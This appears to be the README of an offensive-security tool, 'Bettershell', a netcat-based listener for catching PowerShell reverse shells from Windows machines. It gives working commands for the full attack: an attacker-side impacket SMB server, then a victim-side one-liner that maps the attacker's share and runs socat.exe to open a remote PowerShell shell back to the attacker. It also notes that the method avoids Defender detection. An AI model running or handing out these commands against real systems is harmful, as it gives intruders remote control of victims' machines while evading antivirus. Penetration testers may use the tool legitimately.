Bettershell is a basic netcat client paired with rlwrap, socat, a large Powershell command wordlist, and bash scripting.

Using bettershell in place of a typical nc listener, you can catch Powershell reverse shells that don't die on ctrl+c, autocomplete based on wordlist entries and command output, use arrowkey movement to edit pasted commands without those annoying symbols, and reference a searchable command history. You also get an accurate path prompt, and zero weird echo. Best of all, it's blue - is it really powershell if it isn't?

Bettershell can be used to catch any reverse shell from a Windows box. For stderr piping support, the included socat.exe binary can easily be executed on the victim from an SMB share.

To do so, open port 445, then start up an impacket SMB server on your attack box in the directory with socat.exe:
```
sudo smbserver.py SMB . -comment SMB -ts -debug -smb2support -username user -password pass
```
to get a reverse shell, execute the following on your victim box:
```
cmd.exe /c net use x: \\YOURIP\SMB /user:user pass & x:\socat.exe tcp-connect:$IP:$PORT exec:powershell.exe,pty,stderr
```
The above example shouldn't trigger Defender. Exclude authentication when attacking PCs that don't support it.
